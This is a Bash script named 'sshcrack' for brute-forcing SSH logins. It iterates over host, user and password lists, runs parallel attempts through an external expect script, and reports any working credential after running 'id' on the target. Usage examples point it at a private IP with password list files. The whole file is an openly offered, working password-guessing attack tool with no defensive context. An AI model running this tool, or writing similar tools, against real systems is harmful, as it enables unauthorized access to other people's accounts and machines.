#!/bin/bash

declare -a host_list
declare -a user_list
declare -a passwd_list
declare passwd_res

declare host_list_num=0
declare user_list_num=0
declare passwd_list_num=0
declare sshcrack_logfile="sshcrack.log"
declare sshcrack_timeout=10
declare sshcrack_threadnum=1
declare sshcrack_debug=0

declare sshcrack_flag=0
declare sshcrack_job=0
declare sshcrack_curr_job=0
declare max_col_num=64
declare base_col=1
declare total_run_time
declare max_row_num

declare sshcrack_pid

declare -a playx=('/' '|' '\\' '-')
declare playx_len=4

function sshcrack_show_arg()
{
        sshcrack_job=$((host_list_num * $user_list_num * $passwd_list_num))
	[ $sshcrack_threadnum -gt $sshcrack_job ] && sshcrack_threadnum=$sshcrack_job

        echo -ne "\033[2;1H"
        echo -ne "\033[31;1mhost: $host_list_num | users: $user_list_num | passwd: $passwd_list_num | jobs: $sshcrack_job"
        echo -e " thread: $sshcrack_threadnum | timeout: $sshcrack_timeout | logfile: $sshcrack_logfile\033[0m"
}

function sshcrack_console_init()
{
        echo -ne "\033[2J"
        MAX_ROW_NUM=`stty size|cut -d " " -f 1`
        MAX_COL_NUM=`stty size|cut -d " " -f 2`
        max_row_num=$((MAX_ROW_NUM-5))
}

function sshcrack_console_exit()
{
        local x=$((sshcrack_threadnum + 8)) y=1

        echo -e "\033[${x}:${y}H$passwd_res\033[0m\033[?25h"
}

function sshcrack_run_play()
{
        local i x y tmp_col

        tmp_col=$((sshcrack_curr_job * max_col_num / sshcrack_job))

        x=$((sshcrack_threadnum+6))
        [ $x -gt $max_row_num ] && x=$((max_row_num))

        for ((i = 1; i < $tmp_col; i++))
        do
                y=$((base_col+i))
                [ $y -gt $max_col_num ] && break
                echo -ne "\033[${x};${y}H\033[33m>\033[?25l"
        done
}

function sshcrack_play_init()
{
        local x y

        x=$((sshcrack_threadnum+6))
        [ $x -gt $max_row_num ] && x=$((max_row_num))

        echo -ne "\033[${x};${base_col}H\033[33m[\033[0m"

        y=$((max_col_num+1))
        echo -ne "\033[${x};${y}H\033[33m]\033[0m"
}

function compute_run_time()
{
        local day hour min rtime

        day=$(($1/3600/24)); hour=$(($1/3600)); min=$(($1/60))

        if [ $min -eq 0 ]; then
                sec=$(($1%60)); total_run_time="$sec s"
        else
                if [ $hour -eq 0 ]; then
                        sec=$(($1%60)); total_run_time="$min m $sec s"
                else
                        if [ $day -eq 0 ]; then
                                tmp=$(($1%3600)); min=$(($tmp/60)); sec=$(($tmp%60))
                                total_run_time="$hour h $min m $sec s"
                        else
                                tmp=$(($1%86400)); hour=$(($tmp/3600))
                                tmp1=$(($tmp%3600)); min=$(($tmp1/60)); sec=$(($tmp1%60))
                                total_run_time="$day d $hour h $min m $sec s"
                        fi
                fi
        fi
}

function get_run_time()
{
        local run_count local_hz run_time
        local start_time curr_time

        if [ -d "/proc/$1" ]; then
                run_count=`cat /proc/$1/stat | cut -d " " -f 22`
        else
                return 0
        fi

        local_hz=`getconf CLK_TCK`
        start_time=$(($run_count/$local_hz))

        curr_time=`cat /proc/uptime | cut -d " " -f 1 | cut -d "." -f 1`
        run_time=$((curr_time-start_time))

        return $run_time
}

function sshcrack_show_hlist()
{
	local arg

	echo $host_list_num
	for arg in ${host_list[@]}
	do
		echo $arg
	done
}

function sshcrack_show_ulist()
{
        local arg

        echo $user_list_num
        for arg in ${user_list[@]}
        do
                echo $arg
        done
}

function sshcrack_show_plist()
{
        local arg

        echo $passwd_list_num
        for arg in ${passwd_list[@]}
        do
                echo $arg
        done
}

function sshcrack_init()
{
	local line tmp_list=()

	if [ ! -f $1 ]; then
		tmp_list[0]=$1; tmp_list_num=1
	else
		tmp_list_num=0
		while read line
		do
			tmp_list[$tmp_list_num]=$line
			((++tmp_list_num))
		done < $1
	fi
	
	case $2 in
	1)
		host_list=${tmp_list[*]} 
		host_list_num=$tmp_list_num
		;;
	2)
		user_list=${tmp_list[*]}
		user_list_num=$tmp_list_num
		;;
	3)
		passwd_list=${tmp_list[*]}
		passwd_list_num=$tmp_list_num
		;;
	esac
		
}

#function sshcrack_display_progress()
#{
#        local run_time x y
#
#	sshcrack_run_play
#
#        get_run_time $sshcrack_pid
#        run_time=$?
#
#        compute_run_time $run_time
#
#	x=$((sshcrack_threadnum+6)); y=$((max_col_num+4))
#	[ $x -gt $max_row_num ] && x=$max_row_num
#
#	printf "\033[${x}:${y}H\033[32;1m[%5d/%-5d]\t%s\033[0m" $sshcrack_curr_job $sshcrack_job "$total_run_time"
#}

function sshcrack_display_progress()
{
        local x y

	sshcrack_run_play

	x=$((sshcrack_threadnum+6)); y=$((max_col_num+4))
	[ $x -gt $max_row_num ] && x=$max_row_num

	printf "\033[${x}:${y}H\033[32;1m[%5d/%-5d]\033[0m" $sshcrack_curr_job $sshcrack_job
}

function do_sshcrack()
{
	local ret x=$(($1+4)) y=1

        ./sshcrack.exp $3 $2 $4 $5 $6 >/dev/null
        ret=$?
        if [ $ret -eq 6 ];then
                printf "\033[${x}:${y}H\033[32;1mThread[%2d]\t%s@%s\t\t==>\t[%-16s]\t[success]\t%2d\n\033[0m" $1 $2 $3 $4 $ret
		kill -s SIGUSR2 $sshcrack_pid
                return 0
        else
		if [ $sshcrack_debug -eq 1 ]; then
                	printf "\033[${x}:${y}H\033[32;1mThread[%2d]\t%s@%s\t\t==>\t[%-16s]\t[failed]\t%2d\n\033[0m" $1 $2 $3 $4 $ret
		fi
        fi
        return 1
}

function sshcrack_engine()
{
	local host user passwd ret thread_num=0

	for host in ${host_list[*]}
	do
		for user in ${user_list[*]}
		do
			for passwd in ${passwd_list[*]}
			do
				if [ $sshcrack_flag -eq 1 ]; then
					wait 
					[ $sshcrack_debug -eq 1 ] && sshcrack_display_progress
					return 0
				fi
				if [ $thread_num -ge $sshcrack_threadnum ]; then
					wait; thread_num=0; 
					do_sshcrack $thread_num $user $host $passwd "id" $sshcrack_timeout
					((sshcrack_curr_job++))
					[ $sshcrack_debug -eq 1 ] && sshcrack_display_progress
					continue
				fi
				((sshcrack_curr_job++))
				((thread_num++))
				{
				do_sshcrack $thread_num $user $host $passwd "id" $sshcrack_timeout
				}&
				[ $sshcrack_debug -eq 1 ] && sshcrack_display_progress
			done
		done
	done
}

function trap_sigusr()
{
	#echo "got signal"
	sshcrack_flag=1
}

function sshcrack_signal_init()
{
	sshcrack_pid=$$
	trap trap_sigusr SIGUSR2
}

function sshcrack_usage()
{
	echo -e "$1 <-h host> <-u user> <-p passwd> [-t timeout] [-n threadnum] [-o logfile]\n"
	echo -e "option:"
	echo -e "-h\t\thost name or host list file."
	echo -e "-u\t\tuser name or user list file."
	echo -e "-p\t\tsingle passwd or passwd list file."
	echo -e "-t\t\tconnect timeout, defalut is 5s."
	echo -e "-n\t\tthread num, default is 1."
	echo -e "-o\t\tlog file."
	echo -e "-d\t\tdebug mode."
	echo -e "-v\t\tdisplay help information.\n"
	echo -e "exp:\n"
	echo -e "$1 -h 192.168.215.148 -u wzt -p passwd.lst"
	echo -e "$1 -h 192.168.215.148 -u wzt -p passwd.lst -n 10 -t 2"
	echo -e "$1 -h 192.168.215.148 -u user.lst -p passwd.lst -n 10 -t 2"
	echo -e "$1 -h host.lst -u user.lst -p passwd.lst -n 10 -t 2"
}

function main()
{
	if [ $# -eq 0 ]; then
		sshcrack_usage $0
		exit 0
	fi

        while getopts "h:u:p:n:t:o:d:v" arg
        do
        	case $arg in
                	h)
                        	sshcrack_init $OPTARG 1 ;;
                	u)
                        	sshcrack_init $OPTARG 2 ;;
                	p)
                        	sshcrack_init $OPTARG 3 ;;
                	o)
                        	sshcrack_logfile=$OPTARG ;;
                	t)
                        	sshcrack_timeout=$OPTARG ;;
                	n)
                        	sshcrack_threadnum=$OPTARG ;;
			d)
				sshcrack_debug=$OPTARG ;;
                	v)
                        	sshcrack_usage $0
                        	exit 0
                        	;;
                	?)
                        	echo "Unkown arguments."
                        	exit 1
                        	;;
        	esac
        done

	sshcrack_signal_init
	sshcrack_console_init
	sshcrack_show_arg
	sshcrack_play_init
	sshcrack_engine
	wait
	sshcrack_console_exit
}

main $@
